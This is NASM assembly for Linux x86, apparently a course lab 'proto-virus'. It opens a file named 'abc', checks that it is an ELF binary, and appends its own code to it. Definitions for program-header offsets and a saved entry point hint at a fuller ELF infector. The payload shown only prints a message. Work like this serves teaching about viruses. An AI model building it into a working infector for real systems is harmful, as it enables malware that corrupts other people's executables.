%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define STDOUT 1
%define STDERR 2

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
global _start

section .text

_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            		; Set up ebp and reserve space on the stack for local storage

	write STDOUT, StartMessage, 17

	open FileName, RDWR, 0777
	mov [ebp-4], eax					; save returned fd
	cmp dword[ebp-4], 0					; verify fd >= 0
	jl Error

	mov ecx,ebp
	sub ecx, 8
	read dword[ebp-4], ecx, 4

	mov eax, 0							; verify 'E' 'L' 'F'
	mov al, [ebp-7]
	cmp eax, 69
	jnz Error
	mov al, [ebp-6]
	cmp eax, 76
	jnz Error
	mov al, [ebp-5]
	cmp eax, 70
	jnz Error
	
	lseek [ebp-4],0,SEEK_END
	mov ebx,eax

	mov edx,virus_end					; get virus size
	sub edx,_start

	call get_my_loc
	sub ecx,next_i-_start			; get virus relative address

	write [ebp-4],ecx,edx				; write the virus in file
	cmp eax, 0							; verify no error in writing
	jl Error

	write STDOUT, EndMessage, 10
	mov esp,ebp
	pop ebp 
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
Error:
	write STDERR, ErrorMessage, 19
	exit 1

FileName:	db "abc", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
StartMessage: db "This is a virus",10,0
EndMessage: db "No error",10,0
ErrorMessage: db "Error had occured",10,0
	
PreviousEntryPoint: dd VirusExit

virus_start:
	push ebp
	mov ebp,esp
	write STDOUT,OutStr,32
	pop ebp
	ret
virus_end:

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret


